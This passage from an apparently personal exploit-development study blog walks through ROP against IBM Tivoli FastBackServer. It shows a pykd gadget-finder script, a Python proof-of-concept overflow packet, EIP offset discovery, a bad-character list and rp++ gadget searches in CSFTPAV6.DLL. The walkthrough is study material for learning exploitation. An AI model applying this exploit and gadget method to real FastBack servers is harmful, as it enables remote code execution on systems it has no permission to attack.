</span></span><span style="display:flex;"><span>     log(<span style="color:#e6db74">&#34;Example: findrop.py ntdll 8&#34;</span>)
</span></span><span style="display:flex;"><span>     sys<span style="color:#f92672">.</span>exit()
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>     MAX_GADGET_SIZE <span style="color:#f92672">=</span> int(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">IndexError</span>:
</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">pass</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">ValueError</span>:
</span></span><span style="display:flex;"><span>     log(<span style="color:#e6db74">&#34;Syntax: findrop.py modulename [MAX_GADGET_SIZE]&#34;</span>)
</span></span><span style="display:flex;"><span>     log(<span style="color:#e6db74">&#34;Example: findrop.py ntdll 8&#34;</span>)
</span></span><span style="display:flex;"><span>     log(<span style="color:#e6db74">&#34;MAX_GADGET_SIZE needs to be an integer&#34;</span>)
</span></span><span style="display:flex;"><span>     sys,exit()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> mod <span style="color:#f92672">=</span> getModule(modname)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">if</span> mod:
</span></span><span style="display:flex;"><span>     pages <span style="color:#f92672">=</span> findExecPages(mod)
</span></span><span style="display:flex;"><span>     retn  <span style="color:#f92672">=</span> findRetn(pages)
</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">if</span> retn:
</span></span><span style="display:flex;"><span>         fp <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;C:/tools/pykd/findrop_output.txt&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span>)
</span></span><span style="display:flex;"><span>         fp<span style="color:#f92672">.</span>write(HEADER)
</span></span><span style="display:flex;"><span>         start <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time()
</span></span><span style="display:flex;"><span>         log(<span style="color:#e6db74">&#34;Gadget discovery started...&#34;</span>)
</span></span><span style="display:flex;"><span>         <span style="color:#66d9ef">for</span> ret <span style="color:#f92672">in</span> retn:
</span></span><span style="display:flex;"><span>             count <span style="color:#f92672">+=</span> disasmGadget(ret, mod, fp)                        
</span></span><span style="display:flex;"><span>         fp<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span>         end <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time()
</span></span><span style="display:flex;"><span>         log(<span style="color:#e6db74">&#34;Gadget discovery ended (</span><span style="color:#e6db74">%d</span><span style="color:#e6db74"> secs).&#34;</span> <span style="color:#f92672">%</span> int(end<span style="color:#f92672">-</span>start))
</span></span><span style="display:flex;"><span>         log(<span style="color:#e6db74">&#34;Found </span><span style="color:#e6db74">%d</span><span style="color:#e6db74"> gadgets in </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">.&#34;</span> <span style="color:#f92672">%</span> (count, mod<span style="color:#f92672">.</span>name()))
</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>         log(<span style="color:#e6db74">&#34;ret instructions not found!&#34;</span>)
</span></span></code></pre></div><p>The maximum number of bytes to subtract depends on the length of ROP gadgets we want.</p>
<p>Example of using the tool in WinDb, with a default of 8 bytes length. First we load it, and then we use the custom script we created to find ROP gadgets:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">077</span><span style="color:#f92672">&gt;</span>  .load pykd
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">077</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">!</span>py C:<span style="color:#960050;background-color:#1e0010">\</span>Tools<span style="color:#960050;background-color:#1e0010">\</span>pykd<span style="color:#960050;background-color:#1e0010">\</span>findropfull.py
</span></span><span style="display:flex;"><span><span style="color:#75715e">###############################################################
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># findrop.py pykd Gadget Discovery module #
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">###############################################################
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>[<span style="color:#f92672">+</span>] Syntax: findrop.py modulename [MAX_GADGET_SIZE]
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] Example: findrop.py ntdll <span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">077</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">!</span>py C:<span style="color:#960050;background-color:#1e0010">\</span>Tools<span style="color:#960050;background-color:#1e0010">\</span>pykd<span style="color:#960050;background-color:#1e0010">\</span>findropfull.py FastBackServer
</span></span><span style="display:flex;"><span><span style="color:#75715e">###############################################################
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># findrop.py pykd Gadget Discovery module #
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">###############################################################
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>[<span style="color:#f92672">+</span>] Total Memory Pages: <span style="color:#ae81ff">2060</span>
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] Executable Memory Pages: <span style="color:#ae81ff">637</span>
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] Found <span style="color:#ae81ff">13155</span> ret instructions
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] Gadget discovery started...
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#ae81ff">004</span>bb6fb e105            loope   FastBackServer<span style="color:#f92672">!</span>std<span style="color:#f92672">::</span>pair<span style="color:#f92672">&lt;</span>std<span style="color:#f92672">::</span>basic_string<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">short</span>,std<span style="color:#f92672">::</span>char_traits<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">short</span><span style="color:#f92672">&gt;</span>,std<span style="color:#f92672">::</span>allocator<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">short</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">const</span> ,<span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;::~</span>pair<span style="color:#f92672">&lt;</span>std<span style="color:#f92672">::</span>basic_string<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">short</span>,std<span style="color:#f92672">::</span>char_traits<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">short</span><span style="color:#f92672">&gt;</span>,std<span style="color:#f92672">::</span>allocat<span style="color:#960050;background-color:#1e0010">\</span>x00쓐<span style="color:#960050;background-color:#1e0010">۽쑙Ơ쓐۽쓤۽䡻厨\</span>uffff<span style="color:#960050;background-color:#1e0010">\</span>uffff쓰<span style="color:#960050;background-color:#1e0010">۽\</span>udc81北<span style="color:#960050;background-color:#1e0010">\</span>ue5b0ࡦ<span style="color:#960050;background-color:#1e0010">\</span>udc81北쑡Ơ<span style="color:#960050;background-color:#1e0010">⻐\</span>u07fc츨߯씔<span style="color:#960050;background-color:#1e0010">۽䡋厨\</span>x00<span style="color:#960050;background-color:#1e0010">\</span>x00씠<span style="color:#960050;background-color:#1e0010">۽힗匋뛻</span>K<span style="color:#960050;background-color:#1e0010">\</span>x00<span style="color:#960050;background-color:#1e0010">\</span>x00얱Ơ玈ӏ㔰Ӛ츨߯<span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#ae81ff">004</span>bbf4b e110            loope   FastBackServer<span style="color:#f92672">!</span>std<span style="color:#f92672">::</span>map<span style="color:#f92672">&lt;</span>std<span style="color:#f92672">::</span>basic_string<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">short</span>,std<span style="color:#f92672">::</span>char_traits<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">short</span><span style="color:#f92672">&gt;</span>,std<span style="color:#f92672">::</span>allocator<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">short</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">&gt;</span>,<span style="color:#66d9ef">char</span>,std<span style="color:#f92672">::</span>less<span style="color:#f92672">&lt;</span>std<span style="color:#f92672">::</span>basic_string<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">short</span>,std<span style="color:#f92672">::</span>char_traits<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">short</span><span style="color:#f92672">&gt;</span>,std<span style="color:#f92672">::</span>allocator<span style="color:#f92672">&lt;</span>uns<span style="color:#960050;background-color:#1e0010">\</span>x00쓐<span style="color:#960050;background-color:#1e0010">۽쑙Ơ쓐۽쓤۽䡻厨\</span>uffff<span style="color:#960050;background-color:#1e0010">\</span>uffff쓰<span style="color:#960050;background-color:#1e0010">۽\</span>udc81北<span style="color:#960050;background-color:#1e0010">\</span>ue5b0ࡦ<span style="color:#960050;background-color:#1e0010">\</span>udc81北쑡Ơ<span style="color:#960050;background-color:#1e0010">⻐\</span>u07fc츨߯씔<span style="color:#960050;background-color:#1e0010">۽䡋厨\</span>x00<span style="color:#960050;background-color:#1e0010">\</span>x00씠<span style="color:#960050;background-color:#1e0010">۽힗匋뽋</span>K<span style="color:#960050;background-color:#1e0010">\</span>x00<span style="color:#960050;background-color:#1e0010">\</span>x00얱Ơ玈ӏ㝠Ӛ츨߯<span style="color:#960050;background-color:#1e0010">⻐\</span>u07fc앤<span style="color:#960050;background-color:#1e0010">۽攧厧\</span>x01<span style="color:#960050;background-color:#1e0010">\</span>x00앰<span style="color:#960050;background-color:#1e0010">۽氬匎뽋&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#ae81ff">00630</span>c8b e100            loope   FastBackServer<span style="color:#f92672">!</span>std<span style="color:#f92672">::</span>map<span style="color:#f92672">&lt;</span>ChainStatsKey_t,ChainStatisticsDef,std<span style="color:#f92672">::</span>less<span style="color:#f92672">&lt;</span>ChainStatsKey_t<span style="color:#f92672">&gt;</span>,std<span style="color:#f92672">::</span>allocator<span style="color:#f92672">&lt;</span>ChainStatisticsDef<span style="color:#f92672">&gt;</span> <span style="color:#f92672">&gt;::~</span>map<span style="color:#f92672">&lt;</span>ChainStatsKey_t,ChainStatisticsDef,std<span style="color:#f92672">::</span>less<span style="color:#f92672">&lt;</span>ChainStatsKey_t<span style="color:#f92672">&gt;</span>,std<span style="color:#f92672">::</span>allocator<span style="color:#f92672">&lt;</span>ChainStatisticsD<span style="color:#960050;background-color:#1e0010">\</span>x00쓐<span style="color:#960050;background-color:#1e0010">۽쑙Ơ쓐۽쓤۽䡻厨\</span>uffff<span style="color:#960050;background-color:#1e0010">\</span>uffff쓰<span style="color:#960050;background-color:#1e0010">۽\</span>udc81北<span style="color:#960050;background-color:#1e0010">\</span>ue5b0ࡦ<span style="color:#960050;background-color:#1e0010">\</span>udc81<span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] Gadget discovery <span style="color:#a6e22e">ended</span> (<span style="color:#ae81ff">10</span> secs).
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] Found <span style="color:#ae81ff">30368</span> gadgets in FastBackServer.
</span></span></code></pre></div><p>The TXT file with the ROP gadgets can be queried (and grepped) to find for the ROP gadgets we want.</p>
<h1 id="our-first-rop-exploit">Our first ROP exploit</h1>
<p>Let&rsquo;s use the FastBackServer exploit proof of concept:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> socket  
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys  
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> struct <span style="color:#f92672">import</span> pack  
</span></span><span style="display:flex;"><span><span style="color:#75715e"># psAgentCommand  </span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">=</span> bytearray([<span style="color:#ae81ff">0x41</span>]<span style="color:#f92672">*</span><span style="color:#ae81ff">0xC</span>)  
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#34;&lt;i&#34;</span>, <span style="color:#ae81ff">0x534</span>) <span style="color:#75715e"># opcode  </span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#34;&lt;i&#34;</span>, <span style="color:#ae81ff">0x0</span>) <span style="color:#75715e"># 1st memcpy: offset  </span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#34;&lt;i&#34;</span>, <span style="color:#ae81ff">0x500</span>) <span style="color:#75715e"># 1st memcpy: size field  </span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#34;&lt;i&#34;</span>, <span style="color:#ae81ff">0x0</span>) <span style="color:#75715e"># 2nd memcpy: offset  </span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#34;&lt;i&#34;</span>, <span style="color:#ae81ff">0x100</span>) <span style="color:#75715e"># 2nd memcpy: size field  </span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#34;&lt;i&#34;</span>, <span style="color:#ae81ff">0x0</span>) <span style="color:#75715e"># 3rd memcpy: offset  </span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#34;&lt;i&#34;</span>, <span style="color:#ae81ff">0x100</span>) <span style="color:#75715e"># 3rd memcpy: size field  </span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> bytearray([<span style="color:#ae81ff">0x41</span>]<span style="color:#f92672">*</span><span style="color:#ae81ff">0x8</span>)  
</span></span><span style="display:flex;"><span><span style="color:#75715e"># psCommandBuffer  </span>
</span></span><span style="display:flex;"><span>formatString <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;File: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> From: </span><span style="color:#e6db74">%d</span><span style="color:#e6db74"> To: </span><span style="color:#e6db74">%d</span><span style="color:#e6db74"> ChunkLoc: </span><span style="color:#e6db74">%d</span><span style="color:#e6db74"> FileLoc: </span><span style="color:#e6db74">%d</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span>  
</span></span><span style="display:flex;"><span>(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x200</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>)  
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> formatString  
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Checksum  </span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">=</span> pack(<span style="color:#e6db74">&#34;&gt;i&#34;</span>, len(buf)<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>) <span style="color:#f92672">+</span> buf  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():  
</span></span><span style="display:flex;"><span>    server <span style="color:#f92672">=</span>  <span style="color:#e6db74">&#34;192.168.122.113&#34;</span> 
</span></span><span style="display:flex;"><span>    port <span style="color:#f92672">=</span> <span style="color:#ae81ff">11460</span>  
</span></span><span style="display:flex;"><span>    s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)  
</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>connect((server, port))  
</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>send(buf)  
</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>close()  
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;[+] Packet sent&#34;</span>)  
</span></span><span style="display:flex;"><span>    sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">0</span>)  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:  
</span></span><span style="display:flex;"><span>    main()
</span></span></code></pre></div><p>Let&rsquo;s find the specific offset to crash the buffer:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf-pattern_offset -l <span style="color:#ae81ff">512</span> -q 41326a41 
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Exact match at offset <span style="color:#ae81ff">276</span>
</span></span></code></pre></div><p>At 276 bytes we start overriding EIP.</p>
<p>If we dump the value that ESP has (stack pointer) we find that it is at offset 280.
<strong>This means that ESP points right after the return address</strong>. It is good because we added a offset to override the EIP, and, the following bytes will be pointed by ESP.</p>
<h3 id="rp-for-rop-gadget-search">RP++ for ROP gadget search</h3>
<p>This tool will increase our speed compared to the PYKD tool.
The rp++ tool is a series of open source C++ applications written in C+ and provide support for both 32-bit and 64-bit CPUs.
The various compiled executables can run on Windows, Linux, MacOS and can locate gadgets in PE Files, ELF files and Mach-O files.</p>
<p>Besides supporting a wide array of operating systems, rp++ does not run inside the debugger, but rather works directly on the file system. This provides a massive speed increase and is one of the reasons we prefer it.</p>
<p>We just use the executable targeting the application and a output file to store the results of the search (always <strong>filtering by a gadget length</strong>):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>C:<span style="color:#960050;background-color:#1e0010">\</span>Users<span style="color:#960050;background-color:#1e0010">\</span>user<span style="color:#960050;background-color:#1e0010">\</span>Desktop<span style="color:#960050;background-color:#1e0010">\</span>rp<span style="color:#f92672">-</span>win<span style="color:#f92672">&gt;</span>rp<span style="color:#f92672">-</span>win<span style="color:#f92672">-</span>x86.exe <span style="color:#f92672">-</span>f FastBackServer.exe <span style="color:#f92672">-</span>r <span style="color:#ae81ff">5</span> <span style="color:#f92672">&gt;</span> rop.txt
</span></span></code></pre></div><p>This is an output example of the tool:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>Trying to open <span style="color:#960050;background-color:#1e0010">&#39;</span>FastBackServer.exe<span style="color:#960050;background-color:#1e0010">&#39;</span>..
</span></span><span style="display:flex;"><span>Loading PE information..
</span></span><span style="display:flex;"><span>FileFormat: PE, Arch: Ia32
</span></span><span style="display:flex;"><span>Using the Nasm syntax..
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Wait a few seconds, rp<span style="color:#f92672">++</span> is looking <span style="color:#66d9ef">for</span> gadgets..
</span></span><span style="display:flex;"><span>in .text
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">211283</span> found.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>A total of <span style="color:#ae81ff">211283</span> gadgets found.
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00547b94</span><span style="color:#f92672">:</span> aaa  ; adc dword [eax], eax ; add esp, <span style="color:#ae81ff">0x08</span> ; mov ecx, dword [ebp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x00000328</span>] ; mov dword [ecx<span style="color:#f92672">+</span><span style="color:#ae81ff">0x00000208</span>], <span style="color:#ae81ff">0x00000C04</span> ; call dword [<span style="color:#ae81ff">0x0067E494</span>] ;  (<span style="color:#ae81ff">1</span> found)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00569725</span><span style="color:#f92672">:</span> aaa  ; add byte [eax], al ; add byte [ebx<span style="color:#f92672">+</span><span style="color:#ae81ff">0x0BC0E8C8</span>], cl ; or eax, <span style="color:#ae81ff">0x5DE58B00</span> ; ret  ;  (<span style="color:#ae81ff">1</span> found)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x005417b2</span><span style="color:#f92672">:</span> aaa  ; add byte [eax], al ; call dword [<span style="color:#ae81ff">0x0067E494</span>] ;  (<span style="color:#ae81ff">1</span> found)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00541b78</span><span style="color:#f92672">:</span> aaa  ; add byte [eax], al ; call dword [<span style="color:#ae81ff">0x0067E494</span>] ;  (<span style="color:#ae81ff">1</span> found)
</span></span></code></pre></div><p>We can see that for example the first found gadget is 5 instructions length.</p>
<p>If we for example want to find only &ldquo;pop eax, ret&rdquo; simple gadgets, we can do it as each gadget sequence starts with &ldquo;:&rdquo;. Searching for &ldquo;: pop eax ; ret&rdquo; gives us this result:</p>
<pre tabindex="0"><code>0x004f22f2: pop eax ; ret  ;  (1 found)
0x004f2436: pop eax ; ret  ;  (1 found)
0x0052f30c: pop eax ; ret  ;  (1 found)
0x0061fdc4: pop eax ; ret  ;  (1 found)
0x0066f936: pop eax ; ret  ;  (1 found)
0x0066f98c: pop eax ; ret  ;  (1 found)
0x0066fff0: pop eax ; ret  ;  (1 found)
0x006701af: pop eax ; ret  ;  (1 found)
0x00670628: pop eax ; ret  ;  (1 found)
0x006705e0: pop eax ; ret  ;  (1 found)
0x0067180c: pop eax ; ret  ;  (1 found)
0x006723f6: pop eax ; ret  ;  (1 found)
0x00673430: pop eax ; ret  ;  (1 found)
0x006734ad: pop eax ; ret  ;  (1 found)
0x006744ba: pop eax ; ret  ;  (1 found)
0x0067456e: pop eax ; ret  ;  (1 found)
0x00676646: pop eax ; ret  ;  (1 found)
0x00676b17: pop eax ; ret  ;  (1 found)
0x006770dd: pop eax ; ret  ;  (1 found)
0x0067713a: pop eax ; ret  ;  (1 found)
0x006779af: pop eax ; ret  ;  (1 found)
0x006779c4: pop eax ; ret  ;  (1 found)
0x00677bca: pop eax ; ret  ;  (1 found)
0x00677e82: pop eax ; ret  ;  (1 found)
0x006783e9: pop eax ; ret  ;  (1 found)
</code></pre><p>Several memory locations where the same gadget resides, good for badchars and that stuff.</p>
<p><strong>Note: when searching for badchars, if one char does not seem to be a badchar but the previous one, and when deleting the previous one, the other previous one is badchar also, and this is repeated, it is possible that the badchar is the char that does not seem to be it. I deleted 4 chars in a row thinking that they were badchars, but the actual badchar was after them.</strong>
<strong>Note: common badchars are 00, 09 (HT),, 0b (VT), 0a (LF), 0c (FF), 0d (CR), 0x20 (space)</strong>
The badchars for this program are:</p>
<pre tabindex="0"><code>0x00, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x20
</code></pre><p>Now, we have to locate gadgets to perform what we want. The problem is that the <strong>FastBackServer</strong> module is located at this address:</p>
<pre tabindex="0"><code>0:061&gt; lm m FastBackServer
Browse full module list
start    end        module name
00400000 00c0c000   FastBackServer   (deferred)    
</code></pre><p>So bad as the gadgets from this module will always start at 00. As our payloads will be gadgets, which are memory address inside modules, we can&rsquo;t use this module for the gadgets. We need to find a different module that does not contain a null byte in the uppermost byte and one that is preferably part of the application. If we choose a module that is not part of the application, then the address of gadgets will vary depending on the patch level of the operating system.</p>
<p><strong>Note: Native Windows modules often have additional protections enabled, which will require an even more advanced approach,</strong> therefore, it is recommended to always try to find modules that are native from the application.</p>
<p>Doing &ldquo;lm m&rdquo; list us all the modules. We can go 1 by 1 and see which one is native from the application, and choose one.
For example, this one:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">061</span><span style="color:#f92672">&gt;</span> lmDvmCSFTPAV6
</span></span><span style="display:flex;"><span>Browse full module list
</span></span><span style="display:flex;"><span>start    end        module name
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">50500000</span> <span style="color:#ae81ff">50577000</span>   <span style="color:#a6e22e">CSFTPAV6</span>   (deferred)             
</span></span><span style="display:flex;"><span>    Image path: C:<span style="color:#960050;background-color:#1e0010">\</span>Program Files<span style="color:#960050;background-color:#1e0010">\</span>Tivoli<span style="color:#960050;background-color:#1e0010">\</span>TSM<span style="color:#960050;background-color:#1e0010">\</span>FastBack<span style="color:#960050;background-color:#1e0010">\</span>server<span style="color:#960050;background-color:#1e0010">\</span>CSFTPAV6.DLL
</span></span><span style="display:flex;"><span>    Image name: CSFTPAV6.DLL
</span></span><span style="display:flex;"><span>    Browse all global symbols  functions  data
</span></span><span style="display:flex;"><span>    Timestamp:        Tue Jun  <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">20</span><span style="color:#f92672">:</span><span style="color:#ae81ff">36</span><span style="color:#f92672">:</span><span style="color:#ae81ff">01</span> <span style="color:#ae81ff">2010</span> (<span style="color:#ae81ff">4</span>C056121)
</span></span><span style="display:flex;"><span>    CheckSum:         <span style="color:#ae81ff">0007</span><span style="color:#ae81ff">8277</span>
</span></span><span style="display:flex;"><span>    ImageSize:        <span style="color:#ae81ff">00077000</span>
</span></span><span style="display:flex;"><span>    File version:     <span style="color:#ae81ff">6.0.6030.1648</span>
</span></span><span style="display:flex;"><span>    Product version:  <span style="color:#ae81ff">6.0.6030.1648</span>
</span></span><span style="display:flex;"><span>    File flags:       <span style="color:#ae81ff">0</span> (Mask <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>    File OS:          <span style="color:#ae81ff">4</span> Unknown Win32
</span></span><span style="display:flex;"><span>    File type:        <span style="color:#ae81ff">2.0</span> Dll
</span></span><span style="display:flex;"><span>    File date:        <span style="color:#ae81ff">00000000.00000000</span>
</span></span><span style="display:flex;"><span>    Translations:     <span style="color:#ae81ff">0409.04e4</span>
</span></span><span style="display:flex;"><span>    Information from resource tables:
</span></span><span style="display:flex;"><span>        CompanyName:      Catalyst Development Corporation
</span></span><span style="display:flex;"><span>        ProductName:      <span style="color:#a6e22e">SocketTools</span> (Win32)
</span></span><span style="display:flex;"><span>        InternalName:     CSFTPAV6
</span></span><span style="display:flex;"><span>        OriginalFilename: CSFTPAV6.DLL
</span></span><span style="display:flex;"><span>        ProductVersion:   <span style="color:#ae81ff">6.0.6030.1648</span>
</span></span><span style="display:flex;"><span>        FileVersion:      <span style="color:#ae81ff">6.0.6030.1648</span>
</span></span><span style="display:flex;"><span>        FileDescription:  SocketTools File Transfer Protocol Library
</span></span><span style="display:flex;"><span>        LegalCopyright:   Copyright <span style="color:#ae81ff">2010</span> Catalyst Development Corporation
</span></span><span style="display:flex;"><span>        LegalTrademarks:  SocketTools is a trademark of Catalyst Development Corporation
</span></span><span style="display:flex;"><span>        Comments:         This library may only be redistributed according to the terms of the developer license
</span></span></code></pre></div><p>Let&rsquo;s use the rp++ tool to locate gadgets inside this DLL:</p>
<pre tabindex="0"><code>rp-win-x86.exe -f csftpav6.dll -r 5 &gt; rop.txt
</code></pre><p>We can see that the gadgets start by 0x50, not 0x00, so we &ldquo;bypassed&rdquo; the badchar restriction by choosing other module for our ROP gadgets:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>Trying to open <span style="color:#960050;background-color:#1e0010">&#39;</span>C:<span style="color:#960050;background-color:#1e0010">\</span>Program Files<span style="color:#960050;background-color:#1e0010">\</span>Tivoli<span style="color:#960050;background-color:#1e0010">\</span>TSM<span style="color:#960050;background-color:#1e0010">\</span>FastBack<span style="color:#960050;background-color:#1e0010">\</span>server<span style="color:#960050;background-color:#1e0010">\</span>csftpav6.dll<span style="color:#960050;background-color:#1e0010">&#39;</span>..
</span></span><span style="display:flex;"><span>Loading PE information..
</span></span><span style="display:flex;"><span>FileFormat: PE, Arch: Ia32
</span></span><span style="display:flex;"><span>Using the Nasm syntax..
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Wait a few seconds, rp<span style="color:#f92672">++</span> is looking <span style="color:#66d9ef">for</span> gadgets..
</span></span><span style="display:flex;"><span>in .text
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">28498</span> found.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>A total of <span style="color:#ae81ff">28498</span> gadgets found.
